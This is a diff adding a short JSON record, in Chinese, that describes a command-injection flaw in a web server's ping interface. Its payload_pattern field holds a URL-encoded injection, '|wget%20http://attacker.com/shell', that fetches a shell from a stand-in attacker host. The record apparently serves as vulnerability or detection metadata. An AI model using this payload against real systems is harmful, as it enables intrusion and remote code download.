@@ -1,0 +1,8 @@
+{
+  "vuln_type": "命令注入",
+  "attack_vector": "通过 ping 命令参数注入系统命令",
+  "target_protocol": "HTTP",
+  "target_port": 80,
+  "payload_pattern": "|wget%20http://attacker.com/shell",
+  "description": "PoC 通过向目标服务器的 ping 接口注入命令注入载荷，下载恶意文件"
+}
